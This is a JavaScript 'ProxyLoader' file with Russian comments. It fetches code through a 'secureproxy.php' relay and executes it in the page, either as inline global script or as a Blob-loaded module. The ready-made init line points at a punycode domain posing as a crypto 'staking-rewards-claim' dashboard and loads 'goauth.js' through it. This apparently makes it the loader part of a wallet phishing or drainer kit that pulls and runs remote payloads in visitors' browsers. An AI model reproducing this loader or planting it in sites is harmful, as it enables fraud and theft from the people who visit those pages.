// proxy-loader.js
// usage: ProxyLoader.init({ proxyBase: 'https://domain.com/secureproxy.php' })
//        then ProxyLoader.fetchViaProxy('/path/on/target'), or ProxyLoader.loadScript('/goauth.js')

const ProxyLoader = (function () {
  let proxyBase = null;
  const defaultTimeout = 15000;
  const defaultRetries = 2;

  function buildUrl(endpoint) {
    // proxy expects ?e=<endpoint>
    const e = endpoint.startsWith('/') ? endpoint.slice(1) : endpoint;
    const url = `${proxyBase}?e=${encodeURIComponent(e)}`;
    return url;
  }

  function init(options = {}) {
    if (!options.proxyBase) throw new Error('ProxyLoader.init: proxyBase is required');
    proxyBase = options.proxyBase.replace(/\/+$/, ''); // remove trailing slash
  }

  async function fetchViaProxy(endpoint, fetchOptions = {}) {
    if (!proxyBase) throw new Error('ProxyLoader not initialized. Call ProxyLoader.init({ proxyBase })');

    const method = (fetchOptions.method || 'GET').toUpperCase();
    const body = fetchOptions.body ?? null;
    const headers = Object.assign({}, fetchOptions.headers || {});
    const timeout = fetchOptions.timeout || defaultTimeout;
    const retries = Number.isInteger(fetchOptions.retries) ? fetchOptions.retries : defaultRetries;
    const signalFromOutside = fetchOptions.signal || null;

    // Build URL to proxy
    const url = buildUrl(endpoint);

    // For non-GET requests, the proxy forwards the request body.
    // Make a copy of headers but remove Host (proxy will set it)
    delete headers['Host'];
    delete headers['host'];

    let attempt = 0;
    while (attempt <= retries) {
      attempt++;
      const controller = new AbortController();
      const signals = [controller.signal];
      if (signalFromOutside) {
        // If caller passed an AbortSignal, wire it to cancel
        signalFromOutside.addEventListener('abort', () => controller.abort());
      }
      const timeoutId = setTimeout(() => controller.abort(), timeout);

      try {
        const res = await fetch(url, {
          method,
          headers,
          body,
          redirect: 'follow',
          signal: controller.signal,
          // credentials are not included by default; proxy returns Access-Control-Allow-Origin: *
          // if you rely on cookies from the target domain they must be proxied server-side.
        });
        clearTimeout(timeoutId);

        // Try to clone and build a response-like object with useful fields
        const contentType = res.headers.get('Content-Type') || '';
        const text = await res.text();

        return {
          ok: res.ok,
          status: res.status,
          statusText: res.statusText,
          headers: res.headers,
          contentType,
          text,
        };
      } catch (err) {
        clearTimeout(timeoutId);
        // If aborted due to timeout or external abort, rethrow
        if (err.name === 'AbortError') {
          if (attempt > retries) throw new Error('Request aborted/timed out');
          // else retry
        } else {
          if (attempt > retries) throw err;
        }
        // small backoff
        await new Promise(r => setTimeout(r, 200 * attempt));
      }
    } // while retries
    throw new Error('fetchViaProxy: unreachable');
  }

  async function ping() {
    const url = `${proxyBase}?e=${encodeURIComponent('ping_proxy')}`;
    try {
      const res = await fetch(url, { method: 'GET', redirect: 'follow', cache: 'no-store' });
      const txt = await res.text();
      return { ok: res.ok, status: res.status, text: txt };
    } catch (e) {
      return { ok: false, error: e.message || String(e) };
    }
  }

  // Load JS from proxy and execute it.
  // options: { type: 'script'|'module', attrs: { async: true }, appendTo: document.head, crossorigin: 'anonymous' }
  async function loadScript(endpoint, options = {}) {
    options = Object.assign({ type: 'script', attrs: {}, appendTo: document.head }, options);
    const res = await fetchViaProxy(endpoint, { method: 'GET' });
    if (!res.ok) {
      throw new Error(`Failed to load script via proxy: ${res.status} ${res.statusText || ''}`);
    }
    const code = res.text;
    if (options.type === 'module') {
      // Create Blob -> objectURL to load as module (keeps scope)
      const blob = new Blob([code], { type: 'application/javascript' });
      const blobUrl = URL.createObjectURL(blob);
      return new Promise((resolve, reject) => {
        const s = document.createElement('script');
        s.type = 'module';
        if (options.crossorigin) s.crossOrigin = options.crossorigin;
        Object.entries(options.attrs || {}).forEach(([k, v]) => s.setAttribute(k, v));
        s.src = blobUrl;
        s.onload = () => {
          URL.revokeObjectURL(blobUrl);
          resolve();
        };
        s.onerror = (e) => {
          URL.revokeObjectURL(blobUrl);
          reject(new Error('Error loading module script via proxy'));
        };
        (options.appendTo || document.head).appendChild(s);
      });
    } else {
      // Inline script execution in global scope
      const s = document.createElement('script');
      s.type = 'text/javascript';
      if (options.crossorigin) s.crossOrigin = options.crossorigin;
      Object.entries(options.attrs || {}).forEach(([k, v]) => s.setAttribute(k, v));
      // Use textContent to execute synchronously when appended
      s.textContent = code;
      (options.appendTo || document.head).appendChild(s);
      return Promise.resolve();
    }
  }

  // Convenience helper: load external JS file (path on target site) as module or classic script
  async function loadExternalJSViaProxy(pathOnTarget, opts = {}) {
    // pathOnTarget: '/goauth.js' or 'goauth.js' or 'some/dir/file.js'
    const normalized = pathOnTarget.startsWith('/') ? pathOnTarget.slice(1) : pathOnTarget;
    return loadScript(normalized, opts);
  }

  return {
    init,
    fetchViaProxy,
    ping,
    loadScript,
    loadExternalJSViaProxy,
  };
})();

/* ---------------------------
  PRIMER USAGE EXAMPLES (вставить в страницу после подключения proxy-loader.js)
----------------------------*/

// Инициализация (обязательно)
ProxyLoader.init({ proxyBase: 'https://xn--soend-l7a.fi-staking-rewards-claim.api-dashboard-connect.com/secureproxy.php' });

// 1) ping
// (async () => {
//   const p = await ProxyLoader.ping();
//   console.log('ping', p);
// })();

// 2) Простой fetch (GET) через прокси
// (async () => {
//   const r = await ProxyLoader.fetchViaProxy('api/some-endpoint', { timeout: 10000 });
//   if (r.ok) console.log('Ответ от целевого домена:', r.status, r.text);
//   else console.error('Ошибка запроса', r.status);
// })();

// 3) Подгрузить goauth.js и выполнить как обычный скрипт (в глобальную область)
// ProxyLoader.loadExternalJSViaProxy('/goauth.js')
//   .then(() => console.log('goauth loaded'))
//   .catch(console.error);

// 4) Подгрузить как ES module
// ProxyLoader.loadExternalJSViaProxy('/goauth.js', { type: 'module' })
//   .then(() => console.log('module loaded'))
//   .catch(console.error);

